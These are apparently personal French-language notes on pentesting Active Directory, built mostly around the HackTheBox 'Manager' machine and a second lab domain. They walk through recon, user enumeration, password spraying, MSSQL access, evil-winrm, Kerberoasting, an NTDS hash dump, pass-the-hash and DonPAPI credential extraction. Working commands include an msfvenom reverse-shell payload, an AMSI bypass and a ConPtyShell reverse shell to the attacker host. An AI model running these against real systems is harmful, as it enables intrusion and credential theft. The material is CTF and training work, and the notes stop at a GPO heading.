Ici je vais faire du AD Pentest pour etre balaise dans ce domaine.
D'abord il faut faire un bon scan
`└─$ nmap -sV -Pn -p1-65535 --min-rate 3000 $ip` | `nmap -sC -sV -O  10.10.11.236 -A -T4 --min-rate=500`
```
nmap $ip
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

└─$ nmap -sC -sV -Pn -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269 $ip
PORT     STATE    SERVICE               VERSION
53/tcp   open     domain                Simple DNS Plus
80/tcp   open     http                  Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp   open     kerberos-sec          Microsoft Windows Kerberos (server time: 2024-02-19 01:08:33Z)
135/tcp  open     msrpc                 Microsoft Windows RPC
139/tcp  open     netbios-ssn           Microsoft Windows netbios-ssn
389/tcp  open     ldap                  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-19T01:10:41+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  filtered microsoft-ds
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-19T01:10:38+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open     ms-sql-s              Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-02-19T01:10:38+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-18T21:48:10
|_Not valid after:  2054-02-18T21:48:10
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open     ldap                  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-19T01:10:41+00:00; +6h59m58s from scanner time.
3269/tcp open     ssl/globalcatLDAPssl?
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-19T01:10:35+00:00; +6h59m58s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
```
Ou avec `masscan`
`masscan -p1-65535,U:1-65535 10.10.11.236 --rate=1000 -e tun0`
Maintenant avec les ports ouverts il faut trouver et trier les ports importantes, oubien les enumerer toi meme s'ils sont pas ouverts dans le nmap
```
Host is up (0.25s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
53/tcp  open  tcpwrapped
80/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped
```
oubien les enumerer toi meme s'ils sont pas ouverts
```
└─$ nc -nv $ip 88                             
(UNKNOWN) [10.10.11.236] 88 (kerberos) open
```
Quelque ports important dans mon scan que je peux utiliser si j'ai un username ou password et tout autre attaque
- Kerberos (Port 88)
- LDAP (389, 636, 3268, 3269)
- SMB (139, 445)
- MSSQL (Port 1433)

## Recon Analysis
Grace au nmap,  je trouve le Domain `manager.htb0` et son Domain Controller `dc01.manager.htb` dans le port `389`, `636` qui est `LDAP`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```
└─$ ldapsearch -x -H ldap://10.10.11.236 -s base -LLL
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=manager,DC=htb
ldapServiceName: manager.htb:dc01$@MANAGER.HTB
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=manager,DC=htb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=manager,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=manager,DC=htb
namingContexts: CN=Configuration,DC=manager,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
namingContexts: DC=ForestDnsZones,DC=manager,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 132541
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=manager,DC=htb
dnsHostName: dc01.manager.htb
defaultNamingContext: DC=manager,DC=htb
currentTime: 20240219012738.0Z
configurationNamingContext: CN=Configuration,DC=manager,DC=htb
```

### Password Spray Kerbrute enum
Supposons qu'on a un mot de passe `hacked123` durant notre Pentest,  mais le probleme on connais pas son utilisateur. Dans l'enumeration avec `kerbrute` on peux aussi  mettre les users qu'on a trouver pourque ca teste ce seul mot de passe la avec le module `passwordspray` par kerbrute

**Enumerer les utilsateurs Kerberos**
```
└─$ kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/Seclists/millions_users.txt 
Version: v1.0.3 (9dad6e1) - 02/18/24 - Ronnie Flathers @ropnop

2024/02/18 18:33:54 >  Using KDC(s):
2024/02/18 18:33:54 >   10.10.11.236:88

2024/02/18 18:34:21 >  [+] VALID USERNAME:       ryan@manager.htb
2024/02/18 18:35:04 >  [+] VALID USERNAME:       guest@manager.htb
2024/02/18 18:35:23 >  [+] VALID USERNAME:       cheng@manager.htb
2024/02/18 18:35:41 >  [+] VALID USERNAME:       raven@manager.htb
2024/02/18 18:37:30 >  [+] VALID USERNAME:       administrator@manager.htb

```


- **TIPS**
si tu trouve des users, utilise les aussi comme etant un mots de passe pour du passwordspraying

**Enumerer les utilsateurs crakmapexec**
Avec `cme`, si le anonymous login est autorisee on peux bien enumerer les utilisateurs dans cet AD, en utilisant le `--rid-brute 10000`
```
└─$ crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000
SMB         10.10.11.236    445    NONE             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    NONE             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    NONE             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    NONE             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    NONE             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    NONE             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    NONE             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    NONE             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    NONE             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    NONE             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    NONE             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    NONE             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    NONE             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    NONE             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    NONE             1119: MANAGER\Operator (SidTypeUser)
```

**Password Spray crackmapexec**
Avec `cme` on peux aussi faire du passwordspray

```
└─$ crackmapexec smb 10.10.11.236 -u user.txt -p user.txt --no-brute --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\: 
```
- Si tu trouve des listes d'utilisateurs, faut toujours les mettre en minuscule.
Ici le user `operator` a le meme mot de passe que son utilisateurs.

## Utilisation de mes credenetials
Dans ce reseau, j'ai trouver plusieurs port important et il es temps d'utiliser mes credentials pour voir s'ils vont marcher a un port donnee.
- **SMB**
```
└─$ crackmapexec smb 10.10.11.236 -u operator -p 'operator' --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             \          READ            Logon server share 
```
- **Check the `Password Policy`**
```
└─$ crackmapexec smb 10.10.11.236 -u operator -p 'operator' --pass-pol
SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] Dumping password info for domain: MANAGER
SMB         10.10.11.236    445    DC01             Minimum password length: 7
SMB         10.10.11.236    445    DC01             Password history length: 24
SMB         10.10.11.236    445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.236    445    DC01             
SMB         10.10.11.236    445    DC01             Password Complexity Flags: 000000
SMB         10.10.11.236    445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.11.236    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.11.236    445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password Complex: 0
SMB         10.10.11.236    445    DC01             
SMB         10.10.11.236    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.11.236    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.236    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.10.11.236    445    DC01             Account Lockout Threshold: None
SMB         10.10.11.236    445    DC01             Forced Log off Time: Not Set
```
- **Authenticate on Every Box**
```
└─$ crackmapexec smb 10.10.11.0/24 -u operator -p 'operator'           
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10.0 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] analysis.htb\operator:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [+] rebound.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.241    445    DC               [-] hospital.htb\operator:operator STATUS_LOGON_FAILURE 
```
- **smbclient**
```
┌──(bloman㉿hacker101)-[~/CTFs/Boot2root/VMs]
└─$ smbclient -N -L //10.10.11.236 -U operator%operator

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

└─$ smbclient \\\\10.10.11.236\\SYSVOL
Password for [WORKGROUP\bloman]:
                                                                                                                                      
┌──(bloman㉿hacker101)-[~/CTFs/Boot2root/VMs]
└─$ smbclient \\\\10.10.11.236\\SYSVOL -U operator%operator
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 27 10:19:07 2023
  ..                                  D        0  Thu Jul 27 10:19:07 2023
  manager.htb                        Dr        0  Thu Jul 27 10:19:07 2023

                5446399 blocks of size 4096. 711128 blocks available
smb: \> 
```

- **MSSQL**
Let's now check our creds for the `mssql`. Pour cela on va utiliser le `mssqlclient` pour nous connecter
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```
└─$ sudo mssqlclient.py -port 1433  manager.htb/operator:operator@10.10.11.236 -window
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```
Maintenant faisons un peu de commands sur ceci
```
SQL (MANAGER\Operator  guest@master)> select @@version;
----------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
SQL (MANAGER\Operator  guest@master)> select user_name();
        
-----   
guest   
```
Maintenant pour lister les fichiers et tout autre dans `mssql` on utilise `xp_dirtree`
```
SQL (MANAGER\Operator  guest@master)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0   
```
Maintenant ici je vais voir le directory `inetpub`
```
EXEC xp_dirtree 'C:\inetpub';
subdirectory                     depth   
------------------------------   -----   
custerr                              1   
en-US                                2   
history                              1   
logs                                 1   
temp                                 1   
appPools                             2   
IIS Temporary Compressed Files       2   
wwwroot                              1   
css                                  2   
images                               2   
js                                   2   
```
Maintenant voyons voir le `wwwroot`
```
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1,1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1   
```
Je trouve un backup dans le site, now vas sur le site et telecharge
`└─# wget http://manager.htb/website-backup-27-07-23-old.zip`

## Evil-winrm
Maintenant j'ai pu trouver d'autre `user` and `password`, je vais essayer de me connecter sur la machine distant grace a `evil-winrm` au port `5985`

```
nmap -p 5985,5986 192.168.1.19
nc -nv $ip 5985
(UNKNOWN) [10.10.11.236] 5985 (?) open

```
```
└─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> dir
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
```
Maintenant je vais creer un payload, ensuite l'executer avec `evil-winrm` avec le `    -e, --executables EXES_PATH      C# executables local path`
```
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.35 lport=443 -f exe > rev.exe

└─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123' -e /home/bloman/CTFs/Boot2root/VMs
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
*Evil-WinRM* PS C:\Users\Raven\Documents>*Evil-WinRM* PS C:\Users\Raven\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```
ici j'ai afficher le `menu`, avec le `Invoke-Binary`, je vais bien executer mon payload dans le systems
```
*Evil-WinRM* PS C:\Users\Raven\Documents> Invoke-Binary /home/bloman/CTFs/Boot2root/VMs/rev.exe
```

Pour afficher la version de l'ordinateur `Get-ComputerInfo`
```
*Evil-WinRM* PS C:\Users\Raven\Documents> Get-ComputerInfo

WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 7/20/2021 7:21:49 PM
WindowsProductId                                        : 00429-00521-62775-AA946
WindowsProductName                                      : Windows Server 2019 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
BiosCharacteristics                                     :
BiosBIOSVersion                                         :
BiosBuildNumber                                         :
```
**Shell**
NOTE: `ConPtyShell` uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).
```

*Evil-WinRM* PS C:\Users\svc_backup\Downloads> IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.10.16.35 -RemotePort 443 -Rows 38 -Cols 154

└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.236] 61457
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

```


## Kerberoasting TGT
Si vous compromettez un utilisateur qui possède un ticket kerberos valide (TGT), vous pouvez demander un ou plusieurs tickets de service TGS (Ticket-Granting Service) pour n'importe quel SPN (Service Principal Name) à partir d'un contrôleur de domaine. 

```
└─# GetUserSPNs.py medic.ex/pixis:P4ssw0rd -dc-ip 212.129.29.186
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -------  --------  --------------------------  ---------  ----------
SQL/SQL01             svc_sql            2022-07-02 18:00:09.199337  <never>               
WWW/INTRANET01        svc                2022-07-02 18:00:09.308719  <never>      
```
Note : Si vous obtenez un message "Kerberos SessionError : KRB_AP_ERR_SKEW(Clock skew too great)", c'est probablement parce que la date et l'heure de la machine d'attaque ne sont pas synchronisées avec le serveur Kerberos.



## Dump & Pass-The-Hash
```
└─# crackmapexec smb 212.129.29.186 -u pixis -p "P4ssw0rd" --ntds  
SMB         212.129.29.186  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:medic.ex) (signing:False) (SMBv1:False)
SMB         212.129.29.186  445    DC01             [+] medic.ex\pixis:P4ssw0rd (Pwn3d!)
SMB         212.129.29.186  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         212.129.29.186  445    DC01             Administrateur:500:aad3b435b51404eeaad3b435b51404ee:e390e451a30390791e9ad7cdb65a7d1c:::
SMB         212.129.29.186  445    DC01             Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         212.129.29.186  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:012822d7bc16e785ca053eb47b7d50f2:::
SMB         212.129.29.186  445    DC01             medic.ex\pixis:1254:aad3b435b51404eeaad3b435b51404ee:ac1dbef8523bafece1428e067c1b114f:::
SMB         212.129.29.186  445    DC01             llemoine\llemoine:1255:aad3b435b51404eeaad3b435b51404ee:61c990ebd39bad396abe230c5cf39c79:::
SMB         212.129.29.186  445    DC01             lweiss\lweiss:1256:aad3b435b51404eeaad3b435b51404ee:3ed193aca5aae5f5c0e2c5cb9a2cd802:::
SMB         212.129.29.186  445    DC01             ccoste\ccoste:1257:aad3b435b51404eeaad3b435b51404ee:e686605055f9513f11c882344070b167:::
SMB         212.129.29.186  445    DC01             atessier\atessier:1258:aad3b435b51404eeaad3b435b51404ee:5d83ff768bea7bc9501935427fdcf495:::
SMB         212.129.29.186  445    DC01             cguyon\cguyon:1259:aad3b435b51404eeaad3b435b51404ee:a4ef7f04773627fbe3b123340ca1dbeb:::
SMB         212.129.29.186  445    DC01             cchartier\cchartier:1260:aad3b435b51404eeaad3b435b51404ee:28e7a1af7435bbe4f102ee62052405d7:::
SMB         212.129.29.186  445    DC01             mdavid\mdavid:1261:aad3b435b51404eeaad3b435b51404ee:d522d25403210fcfe70ddd6b8b6e5f57:::
SMB         212.129.29.186  445    DC01             proux\proux:1262:aad3b435b51404eeaad3b435b51404ee:5274068cb4503e1a0b612db31ac9dcaa:::
SMB         212.129.29.186  445    DC01             agauthier\agauthier:1263:aad3b435b51404eeaad3b435b51404ee:0b3c500f4ed6644045bdacceb9458b3e:::
SMB         212.129.29.186  445    DC01             jbertrand\jbertrand:1264:aad3b435b51404eeaad3b435b51404ee:06ee526807869883fb1e4e0227e9c341:::
SMB         212.129.29.186  445    DC01             mlebreton\mlebreton:1265:aad3b435b51404eeaad3b435b51404ee:a38ab3760543bf291caea84a50f2e028:::
SMB         212.129.29.186  445    DC01             pdevaux\pdevaux:1266:aad3b435b51404eeaad3b435b51404ee:6a20d2cc971e517005732d238f5b6fbb:::
SMB         212.129.29.186  445    DC01             sdupuis\sdupuis:1267:aad3b435b51404eeaad3b435b51404ee:ab75dc87eb37a401d262750667022301:::

```

```
└─# psexec.py medic.ex/administrator -H aad3b435b51404eeaad3b435b51404ee:e390e451a30390791e9ad7cdb65a7d1c -dc-ip 212.129.29.186
```

```
└─# crackmapexec smb 212.129.29.186 -u administrator -H aad3b435b51404eeaad3b435b51404ee:e390e451a30390791e9ad7cdb65a7d1c --local-auth
```


## Recuperer des identifiants sur un post compromis
- Une des fonctionnalités de Windows, appelée DPAPI (Data Protection API), permet d’enregistrer de manière chiffrée des informations sensibles sur un ordinateur. Cette fonctionnalité est utilisée par plusieurs composants de Windows et logiciels. C’est le cas des tâches planifiées, des mots de passe des réseaux Wi-Fi ou encore des mots de passe de Chrome. Évidemment, si Windows est capable de les utiliser pour automatiquement se connecter à un réseau Wi-Fi, par exemple, ça veut dire que toutes les clés sont à portée pour que vous puissiez les extraire.
L’outil `DonPAPI` a été créé pour ça. Son but est d’extraire les secrets DPAPI (mais pas que) sur un ensemble de machines à distance. Il faut que vous soyez administrateur local des postes ciblés.
```
└─# DonPAPI medic.ex/pixis:P4ssw0rd@212.129.29.186

INFO Loaded 1 targets
INFO [212.129.29.186] [+] DC01 (domain:medic.ex) (Windows 10.0 Build 20348) [SMB Signing Disabled]
INFO host: \\41.242.89.149, user: ANONYMOUS LOGON, active:     2, idle:     3
INFO Adding connected user ANONYMOUS LOGON from \\41.242.89.149
INFO host: \\41.242.89.149, user: pixis, active:     1, idle:     0
INFO Adding connected user pixis from \\41.242.89.149
INFO [212.129.29.186] [+] Found user Administrateur
INFO [212.129.29.186] [+] Found user All Users
INFO [212.129.29.186] [+] Found user Default
INFO [212.129.29.186] [+] Found user Default User
INFO [212.129.29.186] [+] Found user phackndo
INFO [212.129.29.186] [+] Found user Public
ERROR SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
INFO [212.129.29.186] [+] SAM : Collected 4 hashes 
INFO [212.129.29.186] [+] Gathering DPAPI Secret blobs on the target
INFO [212.129.29.186] [+] Gathering Wifi Keys
INFO [212.129.29.186] [+] Gathering Vaults
INFO [212.129.29.186] [+] Gathering Certificates Secrets 
INFO [212.129.29.186] [+] Gathering Chrome Secrets 
INFO [212.129.29.186] [+]  [Chrome Cookie]  for .google.com [ CONSENT:None ]  expire time: Jul 01 2024 19:33:36
INFO [212.129.29.186] [+]  [Chrome Cookie]  for .google.com [ SOCS:None ]  expire time: Aug 01 2023 19:33:40
INFO [212.129.29.186] [+]  [Chrome Cookie]  for .microsoft.com [ MC1:None ]  expire time: Jul 02 2023 19:35:15
INFO [212.129.29.186] [+]  [Chrome Cookie]  for .microsoft.com [ MS0:None ]  expire time: Jul 02 2022 20:05:15
INFO [212.129.29.186] [+]  [Chrome Cookie]  for docs.microsoft.com [ MSFPC:None ]  expire time: Jul 02 2023 19:35:14
INFO [212.129.29.186] [+]  [Chrome Cookie]  for docs.microsoft.com [ MicrosoftApplicationsTelemetryDeviceId:None ]  expire time: Jul 02 2023 19:35:12
```
The output is .db
```
main: /home/bloman/donpapi.db r/w
sqlite> .tables
browser_version  connected_user   files            users          
certificates     cookies          groups         
compliance       credz            masterkey      
computers        dpapi_hash       user_sid       
sqlite> select * from users
   ...> ;
1||Administrateur|||1
2||All Users|||1
3||Default|||1
4||Default User|||1
5||phackndo|||1
6||Public|||1
7||MACHINE$|||1
sqlite> select * from credz;
1|./212.129.29.186/SAM.sam|Administrateur|00a27c88a6c1bd0ab0944599129c58a6||SAM|1|7
2|./212.129.29.186/SAM.sam|Invité|31d6cfe0d16ae931b73c59d7e0c089c0||SAM|1|7
3|./212.129.29.186/SAM.sam|DefaultAccount|31d6cfe0d16ae931b73c59d7e0c089c0||SAM|1|7
```

- Il y a un autre endroit dans lequel sont enregistrés des mots de passe : la base de registres. Cette base contient les données de configuration du système d'exploitation et des autres logiciels installés désirant s'en servir. Vous pourrez y trouver les identifiants des comptes locaux dans la ruche SAM. C’est ici qu’on peut extraire le hash NT de l’administrateur local de la machine. Il y a également les secrets LSA dans la ruche SECURITY. Ces secrets sont les mots de passe des comptes utilisés pour exécuter des services, par exemple.
Ces secrets peuvent être extraits à l’aide de l’outil `secretsdump.py`, toujours de la suite Impacket.
`secretsdump.py medic.ex/pixis:P4ssw0rd@10.10.10.2`
Si vous avez compromis un contrôleur de domaine, cet outil ira en plus extraire tous les secrets de tous les utilisateurs et postes du domaine. En effet, il utilisera le protocole DRS (Directory Replication Service) pour se faire passer pour un contrôleur de domaine, et demander à la cible une réplication complète. Cela s’appelle la technique du `DCSync`.


## Exploitez les GPO pour compromettre de nouveaux comptes
Parmi les différents rôles d’un Active Directory se trouve le rôle de gestion du parc. Active Directory permet de gérer l’ensemble des machines et utilisateurs du système d’information, et pour cela les stratégies de groupe (Group Policy Objects – GPO) sont un outil indispensable.

